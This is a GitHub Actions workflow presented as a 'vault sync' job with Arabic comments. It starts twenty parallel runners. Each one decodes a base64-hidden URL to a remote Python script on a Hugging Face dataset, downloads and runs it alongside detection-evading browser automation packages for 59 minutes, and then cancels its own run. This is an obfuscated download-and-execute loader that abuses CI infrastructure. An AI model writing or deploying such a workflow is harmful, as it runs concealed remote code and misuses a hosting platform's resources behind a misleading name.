name: Isolated Vault Sync Collective

on:
  workflow_dispatch:

concurrency:
  group: vault-sync-${{ github.workflow }}-${{ github.ref }}
  cancel-in-progress: false

permissions:
  actions: write
  contents: read

jobs:
  # =================================================================
  # حارس النطاق: يُلغي سير العمل عند علامة 59 دقيقة بالضبط
  # =================================================================
  horizon-warden:
    name: "Horizon Warden"
    runs-on: ubuntu-latest
    timeout-minutes: 60
    steps:
      - name: Trigger Horizon Override
        run: |
          echo "[WARDEN] Horizon warden stationed. Override primed at the 59-minute horizon."
          echo "[WARDEN] Tracking execution signature: ${{ github.run_id }}"
          
          # فترة الانتظار المحددة (3540 ثانية = 59 دقيقة)
          sleep 3540
          
          echo "[WARDEN] Horizon crossed! Dispatching override signal..."
          
          # إرسال طلب الإلغاء عبر GitHub API
          curl -sS -X POST \
            -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" \
            -H "Accept: application/vnd.github+json" \
            -H "X-GitHub-Api-Version: 2022-11-28" \
            "https://api.github.com/repos/${{ github.repository }}/actions/runs/${{ github.run_id }}/cancel"
          
          echo "[WARDEN] Override dispatched. Every active and queued unit will be stood down."

  # =================================================================
  # الخلايا المستقلة: إنشاء وتشغيل خلايا التزامن
  # =================================================================
  sync-cells:
    name: "SyncCell-${{ matrix.cell_tag }}"
    runs-on: ubuntu-latest
    timeout-minutes: 59

    strategy:
      fail-fast: false
      matrix:
        cell_tag: [201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 220]

    steps:
      # ⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢
      # ⟴ الطور (1): تمهيد القاعدة
      # ⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢
      - name: Prime Foundation
        run: |
          echo "[PRIME] Priming foundation for SyncCell-${{ matrix.cell_tag }} on Linux..."
          sudo apt update -qq
          sudo apt install -y curl python3-pip

      # ⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢
      # ⟴ الطور (2): جلب الرقاقة التنفيذية
      # ⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢
      - name: Fetch Execution Chip
        run: |
          echo "[FETCH] Fetching sync_task.py from assigned mirror node..."
          MIRROR_NODE=$(echo "aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9zamtoZnVrL2ZvZm8vcmVzb2x2ZS9tYWluL3N0YXJ0LnB5" | base64 --decode)
          curl -sL "$MIRROR_NODE" -o sync_task.py
          echo "[FETCH] Execution chip fetched."

      # ⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢
      # ⟴ الطور (3): تركيب الملحقات
      # ⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢
      - name: Mount Accessories
        run: |
          echo "[MOUNT] Mounting accessory packages..."
          pip3 install -q undetected-chromedriver selenium requests psutil

      # ⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢
      # ⟴ الطور (4): التشغيل المحدد بـ 59 دقيقة
      # ⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢
      - name: Execute Bounded Cycle
        run: |
          echo ">> Initiating SyncCell-${{ matrix.cell_tag }} cycle..."
          
          # تشغيل العملية في الخلفية
          python3 sync_task.py &
          SYNC_PID=$!
          
          echo ">> Bounded cycle engaged. Window: 59 minutes (3540s)."
          
          # الانتظار حتى انتهاء المدة المحددة (59 دقيقة بالضبط)
          sleep 3540
          
          # فحص حالة العملية وإنهاؤها إن كانت لا تزال تعمل
          if kill -0 $SYNC_PID 2>/dev/null; then
            echo ">> Bounded window elapsed! Retiring cycle..."
            kill -9 $SYNC_PID
            echo ">> Cycle retired by window controller."
          else
            echo ">> Cycle completed within bounded window."
          fi
